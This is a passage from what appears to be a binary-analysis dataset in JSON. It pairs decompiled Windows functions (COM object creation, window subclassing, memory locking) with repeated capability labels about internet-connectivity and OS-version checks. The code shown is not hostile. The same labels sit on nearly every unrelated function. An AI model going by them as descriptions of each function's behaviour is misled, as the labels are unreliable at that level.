        "decompiled_code": "\nuint __cdecl fcn.0047d724(uint arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    uVar2 = 0;\n    iVar1 = fcn.00443e78();\n    *arg_ch = iVar1;\n    if (*arg_ch == 0) {\n        uVar2 = 0x80004005;\n    }\n    return uVar2;\n}\n",
        "token_count": 98
    },
    "0047d580": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0047d580(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint nNumber;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = (**(*arg_8h[0x86] + 0x48))(arg_8h[0x86], 1, &nNumber);\n    if (var_4h == 0) {\n        iVar1 = sub.kernel32.dll_MulDiv(nNumber, *(**0x484828 + 0x40), 0x9ec);\n        iVar2 = sub.kernel32.dll_MulDiv(var_8h, *(**0x484828 + 0x40), 0x9ec);\n        if (((*(arg_8h + 0x23d) & 4) != 0) && (arg_8h[0x88] == 0)) {\n            if (0x20 < iVar1) {\n                iVar1 = 0x20;\n            }\n            if (0x20 < iVar2) {\n                iVar2 = 0x20;\n            }\n        }\n        (**(*arg_8h + 0x84))(iVar2, iVar1);\n    }\n    return var_4h;\n}\n",
        "token_count": 290
    },
    "0047b6ac": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047b6ac(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if (*in_EAX != 0) {\n        iVar1 = *(*in_EAX + 8);\n        if (-1 < iVar1 + -1) {\n            do {\n                fcn.0041c4c8();\n                fcn.00403820();\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != 0);\n        }\n        fcn.00403820();\n        *in_EAX = 0;\n    }\n    return;\n}\n",
        "token_count": 132
    },
    "0047baec": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047baec(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uchar *arg_8h;\n    uint arg_8h_00;\n    uint uVar2;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t *var_8h;\n    int32_t var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    arg_8h = &stack0xfffffffc;\n    var_8h = NULL;\n    var_ch = 0;\n    var_10h = 0;\n    var_14h = 0;\n    uStack32 = 0x47bc06;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    var_4h = in_EAX;\n    if (((*(in_EAX + 0x1c) & 0x10) == 0) && (*(*(in_EAX + 0x208) + 0x28) != 0)) {\n        puStack28 = &stack0xfffffffc;\n        uVar1 = fcn.00406298();\n        uVar2 = *(var_4h + 0x208);\n        sub.ole32.dll_CoGetClassObject(uVar2, 5, 0, 0x47bc14, uVar1);\n        fcn.00465b2c();\n        fcn.00404de4();\n        fcn.0040675c();\n        uVar1 = fcn.00406298(var_10h);\n        (**(*var_8h + 0x1c))(var_8h, 0, 0, 0x47bc24, var_ch, uVar1);\n        fcn.0047ba94(arg_8h);\n    }\n    else {\n        fcn.0040675c(&stack0xfffffffc);\n        uVar1 = fcn.00406298(var_14h);\n        uVar2 = 5;\n        arg_8h_00 = 0;\n        sub.ole32.dll_CoCreateInstance(*(var_4h + 0x208), 0, 5, 0x47bc24, uVar1);\n        fcn.0047ba94(arg_8h_00);\n    }\n    *in_FS_OFFSET = uVar2;\n    fcn.004045ec(0x47bc0d);\n    fcn.00404cd4();\n    fcn.00406298();\n    return;\n}\n",
        "token_count": 582
    },
    "0047be60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047be60(uint param_1, int32_t *param_2)\n\n{\n    uint in_EAX;\n    code **in_FS_OFFSET;\n    code *pcVar1;\n    code *pcStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x47beb9;\n    pcStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &pcStack32;\n    fcn.00441384();\n    pcVar1 = fcn.0047cf78;\n    (**(*param_2 + 8))(fcn.0047cf78, in_EAX, fcn.0047c668, in_EAX);\n    *in_FS_OFFSET = pcVar1;\n    return;\n}\n",
        "token_count": 185
    },
    "0047c08c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0047c08c(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    uVar3 = 0;\n    iVar2 = fcn.004544bc();\n    if (iVar2 != 0) {\n        cVar1 = fcn.004039b8();\n        if ((cVar1 == '\\0') || (*(iVar2 + 0x22f) == '\\x01')) {\n            if (*(**0x48466c + 0x44) != 0) {\n                uVar3 = *(*(**0x48466c + 0x44) + 0x248);\n            }\n        }\n        else {\n            uVar3 = *(iVar2 + 0x248);\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 178
    },
    "0047c214": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047c214(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t *piVar2;\n    uint uStack12;\n    \n    if ((*(in_EAX + 0x22c) != 0) && (*(in_EAX + 0x180) == 0)) {\n        uStack12 = 0;\n        piVar2 = *(in_EAX + 0x22c);\n        (**(*piVar2 + 0xc))(piVar2, &uStack12);\n        if (piVar2 == NULL) {\n            fcn.0040c998();\n            fcn.00403fc0();\n        }\n        *(in_EAX + 0x180) = piVar2;\n        uVar1 = sub.user32.dll_GetWindowLongA(piVar2, 0xfffffffc);\n        *(in_EAX + 0x174) = uVar1;\n        **0x4845d8 = in_EAX;\n        sub.user32.dll_SetWindowLongA(*(in_EAX + 0x180), 0xfffffffc, fcn.0043a620);\n        sub.user32.dll_SendMessageA(*(in_EAX + 0x180), 0, 0, 0);\n    }\n    return;\n}\n",
        "token_count": 282
    },
    "0047c2a4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047c2a4(void)\n\n{\n    bool bVar1;\n    code **in_EAX;\n    code *pcVar2;\n    code **ppcVar3;\n    \n    pcVar2 = in_EAX[3];\n    if (pcVar2 != NULL) {\n        bVar1 = false;\n        ppcVar3 = in_EAX + 4;\n        do {\n            if (((*ppcVar3 < 2) && (*ppcVar3 != 1)) && (!bVar1)) {\n                bVar1 = true;\n            }\n            ppcVar3 = ppcVar3 + 3;\n            pcVar2 = pcVar2 + -1;\n        } while (pcVar2 != NULL);\n    }\n    (**in_EAX)();\n    return;\n}\n",
        "token_count": 173
    },
    "0047c2e4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047c2e4(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint *in_FS_OFFSET;\n    uint uStack700;\n    uint uStack696;\n    uchar *puStack692;\n    int32_t var_2a0h;\n    uint var_298h;\n    uint var_294h;\n    uint var_290h;\n    uint var_110h;\n    uint32_t auStack272 [63];\n    uint32_t *var_10h;\n    uint *var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack692 = 0x47c303;\n    fcn.0047c018();\n    if (0xffff < var_2a0h) {\n        var_8h = 0;\n        uStack696 = 0x47c48e;\n        uStack700 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xfffffd44;\n        iVar6 = param_1[2];\n        puStack692 = &stack0xfffffffc;\n        if (iVar6 != 0) {\n            var_10h = *param_1 + iVar6 * 0x10;\n            var_ch = &fcn.0047c2e4::var_290h;\n            iVar7 = 0;\n            puStack692 = &stack0xfffffffc;\n            do {\n                var_10h = var_10h + -4;\n                uVar3 = *var_10h;\n                if ((uVar3 & 0xfff) == 8) {\n                    *var_ch = 0;\n                    iVar1 = var_8h * 8;\n                    puVar2 = &fcn.0047c2e4::var_110h + var_8h * 2;\n                    *puVar2 = 0;\n                    if ((uVar3 & 0x4000) == 0) {\n                        fcn.004053d0();\n                        *(&stack0xfffffef0 + iVar1) = 0;\n                        var_ch[1] = *puVar2;\n                    }\n                    else {\n                        fcn.004053d0();\n                        *(&stack0xfffffef0 + iVar1) = var_10h[2];\n                        var_ch[1] = puVar2;\n                    }\n                    var_8h = var_8h + 1;\n                }\n                else if ((uVar3 & 0xffff) == 4) {\n                    *var_ch = 1;\n                    var_ch[1] = var_10h[2];\n                }\n                else {\n                    uVar5 = (uVar3 & 0xffff) - 5;\n                    if (uVar5 < 3) {\n                        *var_ch = 2;\n                        var_ch[1] = var_10h[2];\n                        var_ch[2] = var_10h[3];\n                    }\n                    else if (uVar5 == 4) {\n                        *var_ch = 0;\n                        var_ch[1] = var_10h;\n                    }\n                    else {\n                        *var_ch = 0;\n                        if ((uVar3 & 0x2000) == 0) {\n                            var_ch[1] = var_10h[2];\n                        }\n                        else {\n                            var_ch[1] = var_10h;\n                        }\n                    }\n                }\n                var_ch = var_ch + 3;\n                iVar7 = iVar7 + 1;\n            } while (iVar7 != iVar6);\n        }\n        fcn.0047c2a4();\n        iVar6 = var_8h;\n        while (iVar6 != 0) {\n            iVar6 = iVar6 + -1;\n            if (*(&stack0xfffffef0 + iVar6 * 8) != 0) {\n                uVar4 = fcn.004053f4();\n                **(&stack0xfffffef0 + iVar6 * 8) = uVar4;\n            }\n        }\n        *in_FS_OFFSET = uStack700;\n        for (iVar6 = var_8h; iVar6 != 0; iVar6 = iVar6 + -1) {\n            puStack692 = 0x47c4bb;\n            fcn.004045c8();\n        }\n    }\n    return;\n}\n",
        "token_count": 974
    },
    "0047c808": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047c808(void)\n\n{\n    uint32_t uVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uchar uVar2;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x47c8ae;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    fcn.00404660();\n    fcn.0043d630();\n    if (*(in_EAX + 0x220) != 0) {\n        (**(**(in_EAX + 0x220) + 0x14))(*(in_EAX + 0x220), 0xfffffd42);\n        uVar1 = *(*(in_EAX + 0x208) + 0x2c);\n        if ((uVar1 & 0x30) != 0) {\n            uVar2 = (uVar1 & 0x10) == 0;\n            fcn.0047c1a0();\n            fcn.004049d4();\n            if (uVar2) {\n                fcn.0047cb78();\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x47c8b5;\n    uStack32 = 0x47c8ad;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 341
    },
    "0047c8f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047c8f0(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    int32_t *piStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x47c9c0;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack40 = 0x47c91b;\n    fcn.0043d71c();\n    if (param_2 != 0) {\n        piStack44 = 0x47c955;\n        uStack48 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd0;\n        puStack40 = &stack0xfffffffc;\n        uVar1 = fcn.00406298();\n        (**(**(in_EAX + 0x218) + 0x10))(*(in_EAX + 0x218), uVar1);\n        *in_FS_OFFSET = uStack48;\n        puStack40 = in_EAX;\n        if (in_EAX != 0) {\n            puStack40 = in_EAX + 0x264;\n        }\n        piStack44 = *(in_EAX + 0x218);\n        uStack48 = 0x47c988;\n        (**(*piStack44 + 0xc))();\n        puStack40 = 0x47c98d;\n        fcn.00465b2c();\n        if (*(in_EAX + 0x220) != 0) {\n            puStack40 = 0xffffffff;\n            piStack44 = *(in_EAX + 0x220);\n            uStack48 = 0x47c9aa;\n            (**(*piStack44 + 0x14))();\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x47c9c7;\n    uStack32 = 0x47c9bf;\n    fcn.00406298();\n    return;\n}\n",
        "token_count": 503
    },
    "0047c9d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047c9d0(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    puStack48 = &stack0xfffffffc;\n    uStack40 = 0x47cab2;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    if (*(in_EAX + 0x248) == '\\0') {\n        *(in_EAX + 0x248) = 1;\n        uStack52 = 0x47ca95;\n        uStack56 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffc8;\n        iVar3 = *(*(in_EAX + 0x244) + 8);\n        if (-1 < iVar3 + -1) {\n            iVar2 = 0;\n            do {\n                if (*(*(*(in_EAX + 0x208) + 0x40) + iVar2 * 4) == param_2) {\n                    piVar1 = fcn.0041c4c8();\n                    (**(*piVar1 + 8))();\n                    fcn.00479824();\n                    fcn.0047c7d8();\n                }\n                iVar2 = iVar2 + 1;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n        *in_FS_OFFSET = uStack56;\n        *(in_EAX + 0x248) = 0;\n        return;\n    }\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x47cab9;\n    uStack40 = 0x47cab1;\n    fcn.00406298();\n    return;\n}\n",
        "token_count": 482
    },
    "0047cc84": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047cc84(int32_t *param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uchar uVar2;\n    ushort uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffcc;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    iVar1 = *param_1;\n    uStack40 = 0x47ce6f;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    // switch table (8 cases) at 0x47ccbc\n    switch(param_2) {\n    case -0x25f:\n    case -0x25e:\n    case -0x25d:\n        if (3 < param_1[2]) {\n            puStack36 = &stack0xfffffffc;\n            fcn.0041110c();\n            fcn.0041110c();\n            uVar4 = fcn.0041110c();\n            uVar5 = fcn.0041110c();\n            if (param_2 == -0x25f) {\n                fcn.00403a28(uVar5, uVar4);\n                in_stack_ffffffcc = uVar5;\n            }\n            else if (param_2 == -0x25e) {\n                in_stack_ffffffcc = 0x47ce4f;\n                fcn.00403a28(uVar5);\n            }\n            else if (param_2 == -0x25d) {\n                fcn.00403a28(uVar5, uVar4);\n                in_stack_ffffffcc = uVar5;\n            }\n        }\n        break;\n    case -0x25c:\n    case -0x25a:\n        if (1 < param_1[2]) {\n            puStack36 = &stack0xfffffffc;\n            uVar3 = fcn.0041110c();\n            fcn.0041110c();\n            if (param_2 == -0x25c) {\n                fcn.00403a28();\n            }\n            else if (param_2 == -0x25a) {\n                fcn.00403a28();\n            }\n            if ((*(iVar1 + 0x11) & 0x40) != 0) {\n                **(iVar1 + 0x18) = uVar3;\n            }\n        }\n        break;\n    case -0x25b:\n        if (0 < param_1[2]) {\n            puStack36 = &stack0xfffffffc;\n            uVar2 = fcn.0041110c();\n            fcn.00403a28();\n            if ((*(iVar1 + 1) & 0x40) != 0) {\n                **(iVar1 + 8) = uVar2;\n            }\n        }\n        break;\n    case -0x259:\n        puStack36 = &stack0xfffffffc;\n        fcn.00403a28();\n        break;\n    case -600:\n        fcn.00403a28();\n    }\n    *in_FS_OFFSET = in_stack_ffffffcc;\n    return;\n}\n",
        "token_count": 728
    },
    "0047cf78": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0047cf78(uint param_1, int32_t *param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uchar *puVar4;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    puStack44 = &stack0xfffffffc;\n    iVar2 = *(in_EAX + 0x214);\n    uStack36 = 0x47d04a;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    uStack48 = 0x47d039;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puVar3 = &stack0xfffffffc;\n    puVar4 = &stack0xfffffffc;\n    if (iVar2 == 0) {\n        uStack56 = 0x47cfbe;\n        fcn.0047bc34();\n        puVar3 = puStack44;\n        puVar4 = puStack32;\n    }\n    puStack32 = puVar4;\n    puStack44 = puVar3;\n    uStack56 = *(in_EAX + 0x214);\n    puStack60 = 0x47cfcd;\n    sub.kernel32.dll_GlobalLock();\n    uStack64 = 0x47d016;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    uVar1 = *(in_EAX + 0x214);\n    puStack60 = &stack0xfffffffc;\n    sub.kernel32.dll_GlobalSize();\n    (**(*param_2 + 0x10))();\n    *in_FS_OFFSET = uVar1;\n    uStack64 = 0x47d01d;\n    uStack68 = *(in_EAX + 0x214);\n    sub.kernel32.dll_GlobalUnlock();\n    return;\n}\n",
        "token_count": 506
    },
    "0047d1f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047d1f0(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack20;\n    uint uStack16;\n    uchar *puStack12;\n    int32_t *var_4h;\n    \n    puStack12 = 0x47d1ff;\n    var_4h = in_EAX;\n    fcn.00443530();\n    if (((*(var_4h[0x82] + 0x2c) & 8) != 0) && (*(var_4h + 0x24b) == '\\0')) {\n        puStack12 = 0x47d222;\n        cVar1 = fcn.00444380();\n        if (cVar1 != '\\0') {\n            *(var_4h + 0x24b) = 1;\n            uStack16 = 0x47d26f;\n            uStack20 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffec;\n            puStack12 = &stack0xfffffffc;\n            (**(*var_4h + 0x50))();\n            fcn.0047c8bc();\n            *in_FS_OFFSET = uStack20;\n            *(var_4h + 0x24b) = 0;\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 303
    },
    "0047d27c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047d27c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_14h;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    int32_t var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack12 = 0;\n    uStack16 = 0;\n    uStack20 = 0;\n    var_14h = 0;\n    uStack32 = 0x47d371;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack40 = 0x47d29f;\n    var_4h = in_EAX;\n    fcn.004435a0();\n    if (((*(*(var_4h + 0x208) + 0x2c) & 6) != 0) && (*(var_4h + 0x24a) == '\\0')) {\n        puStack40 = 0x47d2ca;\n        cVar1 = fcn.00444380();\n        if (cVar1 != '\\0') {\n            *(var_4h + 0x24a) = 1;\n            uStack44 = 0x47d354;\n            uStack48 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffd0;\n            puStack40 = &stack0xfffffffc;\n            if ((*(*(var_4h + 0x208) + 0x2c) & 2) != 0) {\n                puStack40 = &stack0xfffffffc;\n                fcn.0047c7f0();\n            }\n            if ((*(*(var_4h + 0x208) + 0x2c) & 4) != 0) {\n                fcn.0047b264();\n                fcn.0047cc28();\n            }\n            *in_FS_OFFSET = uStack48;\n            *(var_4h + 0x24a) = 0;\n            return;\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x47d378;\n    uStack32 = 0x47d370;\n    fcn.004104d4();\n    return;\n}\n",
        "token_count": 549
    },
    "0047dc08": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0047dc08(int32_t *arg_8h, int32_t arg_ch)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    \n    puStack36 = &stack0xfffffffc;\n    puStack48 = &stack0xfffffffc;\n    puStack60 = &stack0xfffffffc;\n    uStack40 = 0x47de0c;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    uStack52 = 0x47ddde;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    if (arg_ch == -0x202) {\n        if (*(arg_8h + 0x24b) == '\\0') {\n            *(arg_8h + 0x24b) = 1;\n            uStack64 = 0x47dd0b;\n            uStack68 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffbc;\n            fcn.0047c0dc();\n            (**(*arg_8h + 100))();\n            *in_FS_OFFSET = uStack68;\n            *(arg_8h + 0x24b) = 0;\n            return;\n        }\n    }\n    else if (arg_ch == -0x201) {\n        if (*(arg_8h + 0x24a) == '\\0') {\n            *(arg_8h + 0x24a) = 1;\n            uStack64 = 0x47ddcd;\n            uStack68 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffbc;\n            puStack60 = &stack0xfffffffc;\n            puStack48 = &stack0xfffffffc;\n            puStack36 = &stack0xfffffffc;\n            fcn.0047c078();\n            fcn.00426138();\n            *in_FS_OFFSET = uStack68;\n            *(arg_8h + 0x24a) = 0;\n            return;\n        }\n    }\n    else if (arg_ch == -0x200) {\n        if (*(arg_8h + 0x24a) == '\\0') {\n            *(arg_8h + 0x24a) = 1;\n            uStack64 = 0x47dd70;\n            uStack68 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffbc;\n            puStack60 = &stack0xfffffffc;\n            puStack48 = &stack0xfffffffc;\n            puStack36 = &stack0xfffffffc;\n            fcn.0047c1fc();\n            fcn.0047b2b0();\n            *in_FS_OFFSET = uStack68;\n            *(arg_8h + 0x24a) = 0;\n            return;\n        }\n    }\n    else if ((arg_ch == -0x1f5) && (*(arg_8h + 0x249) == '\\0')) {\n        *(arg_8h + 0x249) = 1;\n        uStack64 = 0x47dca8;\n        uStack68 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffbc;\n        puStack60 = &stack0xfffffffc;\n        puStack48 = &stack0xfffffffc;\n        puStack36 = &stack0xfffffffc;\n        fcn.0047c078();\n        fcn.0043d9e8();\n        *in_FS_OFFSET = uStack68;\n        *(arg_8h + 0x249) = 0;\n        return;\n    }\n    *in_FS_OFFSET = uStack56;\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x47de13;\n    uStack40 = 0x47de0b;\n    puStack48 = &stack0xfffffffc;\n    fcn.004104d4();\n    return;\n}\n",
        "token_count": 915
    },
    "0047e324": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0047e324(int32_t arg_8h, uint arg_ch, uint noname_2, uint noname_3, uint noname_4, int32_t *arg_1ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    uStack44 = 0x47e4cc;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    fcn.00405a18(arg_1ch[2]);\n    iVar1 = fcn.00405844();\n    if (arg_1ch[3] < 1) {\n        if (-1 < iVar1) {\n            iVar2 = iVar1 + 1;\n            do {\n                fcn.004107fc();\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n    }\n    else if (-1 < iVar1) {\n        iVar2 = iVar1 + 1;\n        do {\n            fcn.004107fc();\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    if (*(arg_8h + 4) != NULL) {\n        (**(**(arg_8h + 4) + 0x38))();\n    }\n    if (arg_1ch[3] < 1) {\n        iVar2 = 0;\n        if (-1 < iVar1) {\n            iVar1 = iVar1 + 1;\n            do {\n                if ((*(*arg_1ch + iVar2 * 0x10) & 0x4000) == 0x4000) {\n                    fcn.004107fc();\n                }\n                iVar2 